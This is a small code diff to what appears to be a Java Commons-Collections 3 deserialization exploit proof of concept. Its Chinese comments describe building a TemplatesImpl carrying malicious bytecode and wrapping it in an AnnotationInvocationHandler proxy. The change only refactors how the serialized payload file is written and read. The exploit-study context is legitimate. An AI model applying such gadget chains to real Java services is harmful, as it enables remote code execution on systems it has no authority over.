@@ -22,8 +22,6 @@ import java.util.Map;
  */
 public class CC3 {
 
-	public static String fileName = "CC3.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -49,8 +47,8 @@ public class CC3 {
 		// 使用动态代理初始化 AnnotationInvocationHandler
 		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);
 
-		SerializeUtil.writeObjectToFile(invocationHandler, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(invocationHandler);
+		SerializeUtil.readFileObject();
 	}
 
 }
